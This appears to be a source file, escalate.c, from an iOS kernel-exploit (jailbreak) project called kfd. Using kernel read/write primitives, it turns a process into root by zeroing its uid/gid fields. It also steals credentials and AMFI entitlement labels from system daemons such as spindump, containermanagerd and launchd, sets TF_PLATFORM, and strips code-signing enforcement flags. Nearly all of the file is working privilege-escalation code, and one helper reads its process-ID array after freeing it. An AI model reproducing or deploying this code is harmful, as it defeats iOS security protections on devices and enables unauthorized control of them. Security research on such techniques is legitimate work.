//
//  escalate.c
//  kfd
//
//  Created by Seo Hyun-gyu on 2023/08/19.
//
#include <Foundation/Foundation.h>
#include <UIKit/UIKit.h>
#include "krw.h"
#include "offsets.h"
#include "proc.h"
#include "../proc_info.h"
#include "../libproc.h"
#include "escalate.h"



#define SYSTEM_VERSION_EQUAL_TO(v)                  ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] == NSOrderedSame)
#define SYSTEM_VERSION_GREATER_THAN(v)              ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] == NSOrderedDescending)
#define SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(v)  ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] != NSOrderedAscending)
#define SYSTEM_VERSION_LESS_THAN(v)                 ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] == NSOrderedAscending)
#define SYSTEM_VERSION_LESS_THAN_OR_EQUAL_TO(v)     ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] != NSOrderedDescending)



extern char **environ;
static pid_t sysdiagnose_pid = 0;
static bool has_entitlements = false;
pid_t spindump_pid = 0;

#define PROC_ALL_PIDS        1
extern int proc_listpids(uint32_t type, uint32_t typeinfo, void *buffer, int buffersize);
extern int proc_pidpath(int pid, void * buffer, uint32_t  buffersize);

pid_t look_for_proc_internal(const char *name, bool (^match)(const char *path, const char *want))
{
    pid_t *pids = calloc(1, 3000 * sizeof(pid_t));
    int procs_cnt = proc_listpids(PROC_ALL_PIDS, 0, pids, 3000);
    if(procs_cnt > 3000) {
        pids = realloc(pids, procs_cnt * sizeof(pid_t));
        procs_cnt = proc_listpids(PROC_ALL_PIDS, 0, pids, procs_cnt);
    }
    int len;
    char pathBuffer[4096];
    for (int i=(procs_cnt-1); i>=0; i--) {
        if (pids[i] == 0) {
            continue;
        }
        memset(pathBuffer, 0, sizeof(pathBuffer));
        len = proc_pidpath(pids[i], pathBuffer, sizeof(pathBuffer));
        if (len == 0) {
            continue;
        }
        if (match(pathBuffer, name)) {
            free(pids);
            return pids[i];
        }
    }
    free(pids);
    return 0;
}

pid_t look_for_proc(const char *proc_name)
{
    return look_for_proc_internal(proc_name, ^bool (const char *path, const char *want) {
        if (!strcmp(path, want)) {
            return true;
        }
        return false;
    });
}

pid_t look_for_proc_basename(const char *base_name)
{
    return look_for_proc_internal(base_name, ^bool (const char *path, const char *want) {
        const char *base = path;
        const char *last = strrchr(path, '/');
        if (last) {
            base = last + 1;
        }
        if (!strcmp(base, want)) {
            return true;
        }
        return false;
    });
}

pid_t pidOfProcess(const char *name) {
    int numberOfProcesses = proc_listpids(PROC_ALL_PIDS, 0, NULL, 0);
    pid_t pids[numberOfProcesses];
    bzero(pids, sizeof(pids));
    proc_listpids(PROC_ALL_PIDS, 0, pids, (int)sizeof(pids));
    for (int i = 0; i < numberOfProcesses; ++i) {
        if (pids[i] == 0) {
            continue;
        }
        char pathBuffer[PROC_PIDPATHINFO_MAXSIZE];
        bzero(pathBuffer, PROC_PIDPATHINFO_MAXSIZE);
        proc_pidpath(pids[i], pathBuffer, sizeof(pathBuffer));
        if (strlen(pathBuffer) > 0 && strcmp(pathBuffer, name) == 0) {
            return pids[i];
        }
    }
    return 0;
}




uint64_t borrow_entitlements(pid_t to_pid, pid_t from_pid) {
    
    posix_spawnattr_t attrp;
    posix_spawnattr_init(&attrp);
    posix_spawnattr_setflags(&attrp, POSIX_SPAWN_START_SUSPENDED);
    
    pid_t pid2;
    const char *argv[] = {"cfprefsd", NULL};///usr/sbin/cfprefsd
//    const char *argv[] = {"spindump", NULL};///usr/sbin/cfprefsd
    int retVal = posix_spawn(&pid2, "/usr/sbin/cfprefsd", NULL, &attrp, (char* const*)argv, environ);
//    int retVal = posix_spawn(&pid2, "/usr/sbin/spindump", NULL, &attrp, (char* const*)argv, environ);
    if(retVal < 0)
        return false;
    sysdiagnose_pid = pid2;
    
    uint64_t sysdiagnose_proc = proc_of_pid(pid2);
    if(!sysdiagnose_proc)
        return false;
    
    
    
    uint64_t to_proc = proc_of_pid(to_pid);
    uint64_t from_proc = proc_of_pid(pid2);
    
    uint64_t to_ro_proc = kread64(to_proc + off_p_ro);
    uint64_t to_cr_label = kread64(to_ro_proc + off_u_cr_label);
    
    uint64_t from_ro = kread64(from_proc + off_p_ro);
    uint64_t from_cr_label = kread64(from_ro + off_u_cr_label);

    uint64_t to_amfi = kread64(to_cr_label + off_amfi_slot);
    uint64_t from_amfi = kread64(from_cr_label + off_amfi_slot);
    
   // kcallKRW(proc_set_ucred_func, proc_addr, LDproc_ucred, 0, 0, 0, 0, 0);

    kwrite64(to_cr_label + off_amfi_slot, from_amfi);
    
    return to_amfi;
}

void unborrow_entitlements(pid_t to_pid, uint64_t to_amfi) {
    uint64_t to_proc = proc_of_pid(to_pid);
    uint64_t to_ucred = kread64(to_proc + off_p_ucred);
    uint64_t to_cr_label = kread64(to_ucred + off_u_cr_label);
    
    kwrite64(to_cr_label + off_amfi_slot, to_amfi);
}

uint64_t borrow_ucreds(pid_t to_pid, pid_t from_pid) {
    uint64_t to_proc = proc_of_pid(to_pid);
    uint64_t from_proc = proc_of_pid(from_pid);
    
    uint64_t to_ucred = kread64(to_proc + off_p_ucred);
    uint64_t from_ucred = kread64(from_proc + off_p_ucred);
    
    kwrite64(to_proc + off_p_ucred, from_ucred);
    
    return to_ucred;
}

void unborrow_ucreds(pid_t to_pid, uint64_t to_ucred) {
    uint64_t to_proc = proc_of_pid(to_pid);
    
    kwrite64(to_proc + off_p_ucred, to_ucred);
}

bool rootify(pid_t pid) {
    if (!pid) return false;

    uint64_t proc = proc_of_pid(pid);
    uint64_t ucred = kread64(proc + off_p_ucred);
    
    //make everything 0 without setuid(0), pretty straightforward.
    kwrite32(proc + off_p_uid, 0); //all changed in 15.3.1 offsets afaik
    kwrite32(proc + off_p_ruid, 0);
    kwrite32(proc + off_p_gid, 0);
    kwrite32(proc + off_p_rgid, 0);
    kwrite32(ucred + off_u_cr_uid, 0);
    kwrite32(ucred + off_u_cr_ruid, 0);
    kwrite32(ucred + off_u_cr_svuid, 0);
    kwrite32(ucred + off_u_cr_ngroups, 1);
    kwrite32(ucred + off_u_cr_groups, 0);
    kwrite32(ucred + off_u_cr_rgid, 0);
    kwrite32(ucred + off_u_cr_svgid, 0);

    return (kread32(proc + off_p_uid) == 0) ? true : false;
    return false;
}

uint64_t run_borrow_entitlements(pid_t to_pid, char* from_path) {
    posix_spawnattr_t attrp;
    posix_spawnattr_init(&attrp);
    posix_spawnattr_setflags(&attrp, POSIX_SPAWN_START_SUSPENDED);
    
    NSString *from_path_ns = [NSString stringWithUTF8String:from_path];
    char *last_process = [[from_path_ns componentsSeparatedByString:@"/"] lastObject].UTF8String;
    
    pid_t from_pid;
    const char *argv[] = {last_process, NULL};
    int retVal = posix_spawn(&from_pid, from_path, NULL, &attrp, (char* const*)argv, environ);
    if(retVal < 0) {
       // printf("Couldn't posix_spawn");
        return -1;
    }
    
    uint64_t to_proc = proc_of_pid(to_pid);
    uint64_t from_proc = proc_of_pid(from_pid);
    
    uint64_t to_ucred = kread64(to_proc + off_p_ucred);
    uint64_t from_ucred = kread64(from_proc + off_p_ucred);
    
    uint64_t to_cr_label = kread64(to_ucred + off_u_cr_label);
    uint64_t from_cr_label = kread64(from_ucred + off_u_cr_label);
    
    uint64_t to_amfi = kread64(to_cr_label + off_amfi_slot);
    uint64_t from_amfi = kread64(from_cr_label + off_amfi_slot);
    
    kwrite64(to_cr_label + off_amfi_slot, from_amfi);
    
    return to_amfi;
}

void kill_unborrow_entitlements(pid_t to_pid, uint64_t to_amfi, pid_t kill_pid) {
    uint64_t to_proc = proc_of_pid(to_pid);
    uint64_t to_ucred = kread64(to_proc + off_p_ucred);
    uint64_t to_cr_label = kread64(to_ucred + off_u_cr_label);
    
    kwrite64(to_cr_label + off_amfi_slot, to_amfi);
    
    kill(kill_pid, SIGKILL);
}


uint64_t spindump_proc_cred = 0;
uint64_t myold_cred2 = 0;
uint64_t myold_cred3 = 0;
pid_t containermanagerd_pid = 0;
uint64_t containermanagerd_proc_cred = 0;
typedef uint64_t kptr_t;

void patch_TF_PLATFORM(kptr_t task) {
        uint32_t t_flags = kread32(task + off_task_t_flags);
        //off_t_flags);//koffset(KSTRUCT_OFFSET_TASK_TFLAGS));
        util_info("old t_flags %#x", t_flags);

        t_flags |= 0x00000400; // TF_PLATFORM
        kwrite32(task + off_task_t_flags, t_flags);
        t_flags = kread32(task + off_task_t_flags);
        util_info("new t_flags %#x", t_flags);
        //patch_install_tfp0(task, tfp0_exportedBYTW);
        // used in kernel func: csproc_get_platform_binary
}


void safepatch_swap_containermanagerd_cred(uint64_t target_proc){
    if(containermanagerd_proc_cred == 0){
        containermanagerd_pid = 0;
        if(!(containermanagerd_pid = pidOfProcess("containermanagerd"))){ }
        uint64_t containermanagerd_proc = proc_of_pid(containermanagerd_pid);
        util_info("containermanagerd_proc: 0x%llx\n",containermanagerd_proc);
       // containermanagerd_proc_cred = rk64(containermanagerd_proc + koffset(KSTRUCT_OFFSET_PROC_UCRED));
        //util_info("containermanagerd_proc_cred: 0x%llx\n", containermanagerd_proc_cred);
        uint64_t target_task = kread64(target_proc + off_p_task);// OFFSET_bsd_info_task);
        util_info("target_task: 0x%llx\n", target_task);
        patch_TF_PLATFORM(target_task);
        // this is a must-patch in order to get task-mani api to work
    }
    myold_cred3 = kread64(target_proc + off_p_ucred);
    util_info("myold_cred3: 0x%llx\n", myold_cred3);
    kwrite64(target_proc + off_p_ucred, containermanagerd_proc_cred);
    
}

void safepatch_unswap_containermanagerd_cred(uint64_t target_proc){
    kwrite64(target_proc + off_p_ucred, myold_cred3);

}

void safepatch_swap_spindump_cred(uint64_t target_proc){
    posix_spawnattr_t attrp;
    posix_spawnattr_init(&attrp);
    posix_spawnattr_setflags(&attrp, POSIX_SPAWN_START_SUSPENDED);
    pid_t pid;
    const char *argv[] = {"spindump", NULL};

     if(spindump_proc_cred == 0){
        spindump_pid = 0;
        if(!(spindump_pid = pidOfProcess("/usr/sbin/spindump"))){
        int retVal = posix_spawn(&pid, "/usr/sbin/spindump", NULL, &attrp, (char* const*)argv, environ);
        if(retVal < 0)
            printf("failed to spawn spindump\n");
        //sysdiagnose_pid = pid;
            
            // if spindump is not running at moment
            if(fork() == 0){
                daemon(1, 1);
                close(STDIN_FILENO);
                close(STDOUT_FILENO);
                close(STDERR_FILENO);
                execvp("/usr/sbin/spindump", NULL);
                exit(1);
            }
            while(!(spindump_pid = look_for_proc("/usr/sbin/spindump"))){}
        }
        kill(spindump_pid, SIGSTOP);
         
        uint64_t spindump_proc = proc_of_pid(spindump_pid);
         util_info("spindump_proc: 0x%llx", spindump_proc);
            spindump_proc_cred = kread64(spindump_proc + off_p_ucred);
             util_info("spindump_proc_cred: 0x%llx", spindump_proc_cred);
             uint64_t target_task = kread64(target_proc + off_p_task);//OFFSET_bsd_info_task);
             util_info("target_task: 0x%llx", target_task);
            patch_TF_PLATFORM(target_task);
        // this is a must-patch in order to get task-mani api to work
    }
    myold_cred2 = kread64(target_proc + off_p_ucred);
    util_info("myold_cred2: 0x%llx", myold_cred2);
    kwrite64(target_proc + off_p_ucred, spindump_proc_cred);
    has_entitlements = true;

}

void safepatch_unswap_spindump_cred(uint64_t target_proc){
    if(spindump_proc_cred){
        kill(spindump_pid, SIGCONT);
        kill(spindump_pid, SIGKILL);
        spindump_pid = 0;
        spindump_proc_cred = 0;}
        kwrite64(target_proc + off_p_ucred, myold_cred2);
}


bool set_task_platform(pid_t pid, bool set) {
   // setuid(501);
   // setuid(501);
    uint64_t proc = proc_of_pid(pid);
    //printf("proc = 0x%llx\n", proc);

    uint64_t task = kread64(proc + off_p_task);
    uint32_t t_flags = kread32(task + off_task_t_flags);//524291 right , 526339 wrong , 131152 FUCK ITS WRONG AGAIN
   // printf("t_flags = 0x%x\n", t_flags);

    if (set) {
        t_flags |= TF_PLATFORM;//525315 right , 527363 wrong //1024 tfPlatflorm alone //
       // printf("t_flags = 0x%x\n", t_flags);
        //132167
    } else {
        t_flags &= ~(TF_PLATFORM);
      //  printf("t_flags = 0x%x\n", t_flags);

    }
    
    kwrite32(task + off_task_t_flags, t_flags);
    
    return true;
}
#define CS_HARD            0x00000100  /* don't load invalid pages */
#define CS_KILL            0x00000200  /* kill process if it becomes invalid */
#define CS_RESTRICT        0x00000800  /* tell dyld to treat restricted */
#define CS_ENFORCEMENT     0x00001000  /* require enforcement */
#define CS_REQUIRE_LV      0x00002000  /* require library validation */
#define CS_PLATFORM_BINARY 0x04000000  /* this is a platform binary */

#define MAKE_KPTR(v) (v | 0xffffff8000000000)
//uint64_t proc_set_ucred_func;
typedef uint32_t kptr32_t;

kptr_t gettnproc(pid_t pid2get) {
    
    kptr_t proc_2get = proc_of_pid(pid2get);//18446744025145012176

    return proc_2get;
}


kptr_t gettnproc_ro(uint64_t proc_ro_2get) {
    
    kptr_t proc_ro = kread64(proc_ro_2get + off_p_ro);//PROC_RO(proc);

    return proc_ro;
}

kptr32_t gettnproc_cs(uint64_t proc_ro_cs_2get) {
    
    kptr32_t cSsflags = kread32(proc_ro_cs_2get + off_p_csflags);//PROC_RO(proc);
    cSsflags = cSsflags | CS_DEBUGGED | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW;//905977868
    //printf("flags = 0x%x\n", flags);
    cSsflags &= ~(CS_HARD | CS_KILL | CS_RESTRICT | CS_ENFORCEMENT | CS_REQUIRE_LV);//905969676

    return cSsflags;
}


int mixnproc_cs(kptr32_t proc_ro_cs_2get, kptr32_t cSsflags) {
    

    
    kwrite32(gettnproc_ro(gettnproc_ro(gettnproc(getpid()))) + off_p_csflags, cSsflags);


    return 0;
    
}

void set_proc_csflags(pid_t pid) {
    if (SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"15.2")) {
       // printf("getuid: %d\n", getuid());
        uint64_t result = gettnproc_ro(gettnproc(pid));
        mixnproc_cs(result, gettnproc_cs(result));
                  
        /*uint64_t proc = proc_of_pid(pid);//18446744025145012176
        uint64_t proc_ro = kread64(proc + off_p_ro);//PROC_RO(proc);
        //printf("proc_ro = 0x%llx\n", proc_ro);
        //printf("flags_ro = 0x%llx\n", flags_ro);//838868996
        uint32_t flags = kread32(proc_ro + off_p_csflags);
        //printf("flags = 0x%x\n", flags);//838868996
        uint64_t flags_ro = kread64(proc + 0x78);//18446744025160465024
        uint64_t flags_ro_cl = kread64(proc_ro + 0x78);//18446744013209437520
        //flags &= CS_PLATFORM_BINARY;
        flags = flags | CS_DEBUGGED | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW;//905977868
        //printf("flags = 0x%x\n", flags);
        flags &= ~(CS_HARD | CS_KILL | CS_RESTRICT | CS_ENFORCEMENT | CS_REQUIRE_LV);//905969676
        //flags &= ~(CS_RESTRICT | CS_HARD | CS_KILL);
        //printf("flags = 0x%x\n", flags);
        kwrite32(proc + 0x78, flags);
        //flags_ro_cl = kread64(flags_ro + 0x1c);
        flags = kread32(proc_ro + off_p_csflags);
        proc_ro =kread64(proc + 0x78);//PROC_RO(proc);//18446744023075913740
*/
        
       // kcallKRW(proc_ro + off_p_csflags, proc_set_ucred_func, flags, 0, 0, 0, 0, 0);
       // kcallKRW(proc_set_ucred_func, kread32(proc_ro + off_p_csflags), flags, 0, 0, 0, 0, 0);

        // use proc_set_ucred to set kernel ucred.
        //kwrite64(proc_ro + off_p_csflags, flags);
    } else {
        uint64_t proc = proc_of_pid(pid);
        uint32_t csflags = kread32(proc + off_p_csflags);//838868996
        //printf("csflags = 0x%x\n", csflags);
        csflags = csflags | CS_DEBUGGED | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW;//905977868, 905977868
       // printf("csflags = 0x%x\n", csflags);
        csflags &= ~(CS_RESTRICT | CS_HARD | CS_KILL);//905977868
       // printf("csflags = 0x%x\n", csflags);

        kwrite32(proc + off_p_csflags, csflags);

    }
    
}

uint64_t get_cs_blob(pid_t pid) {
    uint64_t proc = proc_of_pid(pid);
    uint64_t textvp = kread64(proc + off_p_textvp);////0x2bc 648, 640?  0x18C
   // printf("textvp = 0x%llx\n", textvp);
    uint64_t ubcinfo = kread64(textvp + off_vnode_vu_ubcinfo);
  //  printf("ubcinfo = 0x%llx\n", ubcinfo);
    return kread64(ubcinfo + off_ubc_info_cs_blobs);
}






void set_csb_platform_binary(pid_t pid) {
    
    uint64_t cs_blob = get_cs_blob(pid);
    if (SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"15.2")) {
        borrow_entitlements(pid, 1);
    } else {
        kwrite32(cs_blob + off_cs_blob_csb_platform_binary, 1);
    }
}

void platformize(pid_t pid) {
    /*if (SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"15.2")) {
        borrow_entitlements(pid, 1);
    } else {
       */
    
        set_task_platform(pid, true);
        set_proc_csflags(pid);
        set_csb_platform_binary(pid);
    //}
}
#define PROC_TASK(proc)  kread64((proc) + 0x10ULL)
#define PROC_RO(proc)    kread64((proc) + 0x20ULL)
#define PROC_PID(proc)   kread32((proc) + 0x68ULL)

#define PROC_RO_CSFLAGS(proc_ro)          kread32((proc_ro) + 0x1CULL)
#define PROC_RO_CSFLAGS_SET(proc_ro, new) { uint32_t v = (uint32_t)(new); do_kwrite((proc_ro) + 0x1CULL, &v, 4); }
uint64_t proc_ro;
void newplatformize(pid_t pid){
    uint64_t proc = proc_of_pid(pid);
    uint64_t task = kread64(proc + off_p_task);
    uint32_t t_flags = kread32(task + off_task_t_flags) | TF_PLATFORM;//524291 right , 526339 wrong , 131152 FUCK ITS WRONG AGAIN
    kwrite32(task + off_task_t_flags, t_flags);
    uint32_t flags = PROC_RO_CSFLAGS(PROC_RO(proc)) | CS_PLATFORM_BINARY;
    flags &= ~(CS_HARD | CS_KILL | CS_RESTRICT | CS_ENFORCEMENT | CS_REQUIRE_LV);
    
    uint64_t procLD = proc_of_pid(1);
    uint64_t procLD_ro = kread64(procLD + 0x20);
    uint32_t t_flagsLD = kread32(procLD_ro + 0x1c);//524291 right , 526339 wrong , 131152 FUCK ITS WRONG AGAIN

    
    borrow_entitlements(getpid(), 1);
    
    uint64_t pro_ = kread64(proc + 0x20);
    uint32_t ro_flags = kread32(pro_ + 0x1c);//PROC_RO_CSFLAGS(PROC_RO(proc)) | CS_PLATFORM_BINARY;
    //printf("  ro_flags = 0x%x\n", ro_flags);//905969668
    uint32_t flagscheck = kread32(pro_ + 0x1c);//838868996
    flagscheck = kread32(pro_ + 0x1c);//838868996
   // printf("flagscheck = 0x%x\n", flagscheck);//905969668
    kwrite64(proc, procLD);
    pro_ = kread64(proc + 0x20);
    flagscheck = kread32(pro_ + 0x1c);//838868996

    
}
/*
 [0x0000]: fffffff01c03a968 0000002a00000001 fffffff5825a7a30 fffffff5825a4438 0001000100000001 fffffff49bec8400 0000000000000000 fffffff2cfeef0f0
 [0x0040]: 0000000000000000 0000000000000000 fffffff5825a4048 0000000000000000 0000000000000000 0000000000004000 fffffff57fc96bf8 0000000000000000
 [0x0080]: fffffff2cfb54960 0000000000000000 0000000000000000 0101000100000000 1ea5cace00000000 0000001400000000 0000000000000000 0000002a00000000
 [0x00c0]: fffffff6ba008e60 0000000000000000 0000000000000000 0000000000000000 0000000000000000 fffffff3b55ea170 0000000000000000 0000000000000000
 [0x0100]: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000
 [0x0140]: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000
 [0x0180]: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000
 [0x01c0]: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000
 [0x0200]: 0000000000000100 0000000000000000 0000000000000000 fffffff5825a4210 0000000000000000 fffffff5825a4220 0000000000000000 0000000000000000
 [0x0240]: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000
 [0x0280]: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 fffffff3b55e9b80 0000000000000002 0000000000000000 0000000000000000
 [0x02c0]: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000
 [0x0300]: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000000
 [0x0340]: fffffff49c7a4b40 fffffff49c7a4b68 0000000100000001 0000000000010001 fffffff6b9238a80 0000000000000000 0000000000000000 0000000000000000
 [0x0380]: fffffff6b5e11040 0000000000000000 0000000000000001 0000000000000000 0000000000000000 0000000000000000 0000000000000000 0000000000000020
 [0x03c0]:
 */
